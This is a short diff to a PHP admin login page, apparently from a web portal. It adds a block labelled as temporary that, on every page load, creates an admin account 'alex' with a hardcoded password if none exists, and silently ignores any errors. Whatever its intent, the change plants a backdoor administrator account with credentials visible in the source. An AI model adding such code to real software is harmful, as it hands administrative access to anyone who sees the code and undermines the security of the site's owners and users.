@@ -13,6 +13,19 @@ if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true
 
 require_once __DIR__ . '/../config/database.php';
 
+// Temporary snippet to create admin user 'alex'
+try {
+    $pdo = getPortalDB();
+    $stmt = $pdo->prepare("SELECT id FROM admin_users WHERE username = 'alex'");
+    $stmt->execute();
+    if (!$stmt->fetch()) {
+        $stmt = $pdo->prepare("INSERT INTO admin_users (username, password) VALUES ('alex', ?)");
+        $stmt->execute([password_hash('escall', PASSWORD_DEFAULT)]);
+    }
+} catch (Exception $e) {
+    // ignore
+}
+
 $error = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
